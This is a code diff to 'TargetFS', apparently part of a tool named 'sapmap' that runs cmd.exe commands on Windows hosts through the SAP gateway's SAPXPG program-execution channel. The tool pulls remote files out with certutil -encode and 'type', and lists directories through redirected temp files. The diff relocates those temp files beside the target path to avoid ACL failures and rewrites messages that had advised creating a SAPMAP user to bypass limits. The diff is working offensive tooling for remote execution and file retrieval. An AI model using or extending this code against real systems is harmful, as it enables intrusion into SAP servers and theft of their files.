@@ -1117,6 +1117,22 @@ class TargetFS:
         tag = "".join(_r.choice(_s.ascii_lowercase) for _ in range(8))
         return f"{self._WIN_TMP_DIR}\\sapmap_{tag}{suffix}"
 
+    def _win_tmp_near(self, remote_path: str, suffix: str) -> str:
+        """Temp path in the same directory as ``remote_path``.
+
+        Avoids ``C:\\Windows\\Temp`` ACL issues: that directory's
+        CREATOR OWNER ACE means files certutil writes can't be read
+        back by ``type`` when they run under different thread contexts
+        in the SAPXPG service.  Putting the temp next to the source
+        guarantees both have the same NTFS permissions."""
+        import random as _r
+        import string as _s
+        tag = "".join(_r.choice(_s.ascii_lowercase) for _ in range(8))
+        p = remote_path.replace("/", "\\")
+        idx = p.rfind("\\")
+        parent = p[:idx] if idx >= 0 else self._WIN_TMP_DIR
+        return f"{parent}\\sapmap_{tag}{suffix}"
+
     # EXTPROG field is 128 bytes.  "cmd.exe /C " prefix is 11 chars,
     # leaving 117 for the tail.  Commands under this threshold go
     # entirely in EXTPROG (stdout works on GW SAPXPG).  Longer ones
@@ -1234,7 +1250,10 @@ class TargetFS:
                     pass
 
         _emit(0, "single_shot")
-        tmp = self._win_tmp(".b64")
+        # Put temp file next to the source — avoids C:\Windows\Temp
+        # ACL issue where certutil-created files can't be read back
+        # by `type` (CREATOR OWNER ACL blocks cross-context reads).
+        tmp = self._win_tmp_near(remote_path, ".b64")
         print(f"[*] {self.label}: download_windows({remote_path!r}, "
               f"size={size} B) via certutil -encode → {tmp}")
         # Step 1: certutil -encode → temp file (no stdout needed)
@@ -1417,15 +1436,14 @@ class TargetFS:
                      "entries": entries, "error": ""}
 
         print(f"[-] {self.label}:   ALL Windows listing strategies "
-              f"failed for {remote_path} — SAPXPG channel is unusable "
-              f"for this path.  Create a SAPMAP user (SXPG channel) "
-              f"to bypass this limit.")
+              f"failed for {remote_path} — the exec channel returned "
+              f"no output for any listing variant.")
         return {"ok": False, "path": remote_path, "entries": [],
-                 "error": ("dir returned no output via GW SAPXPG — "
+                 "error": ("All dir listing methods returned empty — "
                            "the exec channel dropped stdout even for "
-                           "bare-names + file-redirect fallbacks. "
-                           "Create a SAPMAP user for the SXPG channel "
-                           "to bypass this limit.")}
+                           "bare-names + file-redirect fallbacks.  "
+                           "Check that the exec channel can reach this "
+                           "path (permissions, network shares).")}
 
     def _list_dir_via_names_windows(self, remote_path: str
                                       ) -> Optional[list]:
@@ -1501,7 +1519,12 @@ class TargetFS:
           3. ``del /q /f "tmpfile" 2>nul``   (cleanup)
           4. Parse names → batched stat for metadata
         """
-        tmp = self._win_tmp(".dir")
+        # Use a dummy file name inside the listed directory as the
+        # anchor for _win_tmp_near — avoids the C:\Windows\Temp ACL
+        # issue.  If the directory itself is not writable (unlikely
+        # for dirs we can enumerate), _win_cmd will fail gracefully.
+        tmp = self._win_tmp_near(
+            remote_path.rstrip("\\") + "\\x", ".dir")
         print(f"[*] {self.label}:   file-redirect: "
               f'dir /B /A "{remote_path}" > "{tmp}"')
         self._win_cmd(f'dir /B /A "{remote_path}" >"{tmp}"')
